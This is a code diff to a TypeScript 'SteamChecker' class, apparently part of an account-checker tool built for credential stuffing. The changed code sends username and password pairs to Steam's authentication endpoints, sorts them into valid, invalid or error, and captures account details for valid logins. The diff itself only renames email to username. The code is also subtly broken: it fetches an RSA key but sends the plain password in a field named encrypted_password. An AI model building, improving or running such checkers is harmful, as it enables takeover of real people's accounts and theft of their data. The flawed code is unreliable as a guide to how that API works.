@@ -2,21 +2,21 @@ import { BaseChecker } from './base';
 import { CheckResult } from '@/types';
 
 export class SteamChecker extends BaseChecker {
-  async check(email: string, password: string): Promise<CheckResult> {
+  async check(username: string, password: string): Promise<CheckResult> {
     try {
-      // Steam login endpoint
+      // Steam login endpoint - Steam uses account_name which can be username
       const response = await this.client.post(
         'https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/',
         {
-          account_name: email,
+          account_name: username,
         }
       );
 
-      // Simulate login attempt
+      // Simulate login attempt with username
       const loginResponse = await this.client.post(
         'https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/',
         {
-          account_name: email,
+          account_name: username,
           encrypted_password: password,
           encryption_timestamp: Date.now(),
           remember_login: true,
@@ -28,13 +28,13 @@ export class SteamChecker extends BaseChecker {
         // Get account details
         const capture = await this.getAccountDetails(loginResponse.data.response.steamid);
         
-        return this.createResult(email, password, 'steam', 'valid', capture);
+        return this.createResult(username, password, 'steam', 'valid', capture);
       }
 
-      return this.createResult(email, password, 'steam', 'invalid');
+      return this.createResult(username, password, 'steam', 'invalid');
     } catch (error: any) {
       return this.createResult(
-        email,
+        username,
         password,
         'steam',
         'error',
